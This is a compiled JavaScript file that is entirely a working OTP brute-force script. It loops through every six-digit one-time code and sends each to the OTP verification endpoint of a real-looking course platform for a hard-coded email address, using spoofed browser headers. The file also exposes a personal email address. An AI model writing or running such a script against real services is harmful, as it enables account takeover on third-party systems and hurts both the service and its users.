"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function attackNow({ email, otp, newPassword }) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = JSON.stringify({
            email,
            otp,
            newPassword
        });
        let config = {
            method: 'get',
            maxBodyLength: Infinity,
            url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=sahiltiwaskar2003%40gmail.com&otp=${otp}`,
            headers: {
                'accept': '*/*',
                'accept-language': 'en-GB,en;q=0.8',
                'auth-key': 'appxapi',
                'client-service': 'Appx',
                'device-type': '',
                'origin': 'https://harkirat.classx.co.in',
                'priority': 'u=1, i',
                'referer': 'https://harkirat.classx.co.in/',
                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'sec-gpc': '1',
                'source': 'website',
                'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36'
            }
        };
        try {
            yield axios_1.default.request(config);
            console.log("done for " + otp);
        }
        catch (e) {
            // @ts-ignore
            console.log(e.response.data);
            console.log("failed for " + otp);
        }
    });
}
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 0; i < 999999; i += 100) {
            let p = [];
            for (let j = 0; j < 100; j++) {
                p.push(yield attackNow({
                    email: "sahil@gmail.com",
                    otp: (i + j).toString(),
                    newPassword: "Newpassword"
                }));
            }
            yield Promise.all(p);
        }
    });
}
main();
